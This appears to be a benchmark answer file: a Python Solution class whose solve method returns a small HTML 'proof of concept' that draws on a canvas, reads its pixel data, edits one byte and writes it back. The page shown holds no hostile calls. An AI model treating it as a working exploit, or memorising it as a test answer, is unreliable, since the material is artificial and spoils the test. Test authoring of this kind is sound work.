class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = r'''<!DOCTYPE html>
<html>
<body>
<canvas id="canvas" width="100" height="100"></canvas>
<script>
var canvas = document.getElementById("canvas");
var ctx = canvas.getContext("2d");
ctx.fillStyle = "red";
ctx.fillRect(0, 0, 100, 100);
var imageData = ctx.getImageData(0, 0, 100, 100);
var data = imageData.data;
ctx.clearRect(0, 0, 100, 100);
data[0] = 255;
ctx.putImageData(imageData, 0, 0);
</script>
</body>
</html>'''
        return poc.encode('utf-8')
